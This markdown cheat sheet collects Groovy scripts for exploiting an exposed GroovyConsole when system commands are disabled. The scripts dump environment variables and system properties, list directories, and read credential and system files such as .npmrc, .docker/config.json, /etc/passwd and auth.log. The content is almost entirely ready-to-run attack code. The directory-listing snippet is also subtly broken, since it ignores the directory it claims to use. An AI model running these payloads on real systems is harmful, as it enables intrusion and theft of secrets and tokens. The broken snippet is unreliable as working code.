## Output below is a list of scripts that can help you prove RCE in GroovyConsole in case direct access to system commands are disabled

## Get Environment Variables
```
def envVars = System.getenv()

envVars.each { key, value ->
    println "${key} = ${value}"
}
```

## Get all System Properties
```
def sysProps = System.getProperties()

sysProps.each { key, value ->
    println "${key} = ${value}"
}
```
## List Files of Home Directory
```
def homeDir = new File(System.getProperty("user.home"))

println "Home Directory: ${homeDir.absolutePath}"
println "Contents:"

homeDir.eachFile { file ->
    println file.name
}
```
## List Files of Any Specified Directory (ls -la)
> Simply change the `optDirectory` to specified directory, say `/etc`
```
def homeDir1 = new File(System.getProperty("user.home"))
def optDirectory = new File("/opt")

println "Home Directory: ${homeDir1.absolutePath}"
println "Contents:"

homeDir1.eachFile { file ->
    if (file.isDirectory()) {
        println "[DIR]  ${file.name}"
    } else if (file.isFile()) {
        println "[FILE] ${file.name}"
    }
}
```

## Define a list of internal files and return its output (Local File Disclosure)
```
def homeDir = new File(System.getProperty("user.home"))
def filesToCheck = [
    '/var/log/auth.log', 
    '.npmrc', 
    '.docker/config.json',
    '/etc/passwd'  // Unix-like systems only
]

filesToCheck.each { fileName ->
    def file = new File(fileName.startsWith('/') ? fileName : "${homeDir}/${fileName}")
    if (file.exists()) {
        println "Contents of ${fileName}:"
        file.eachLine { line ->
            println line
        }
    } else {
        println "${fileName} not found or inaccessible."
    }
}

```
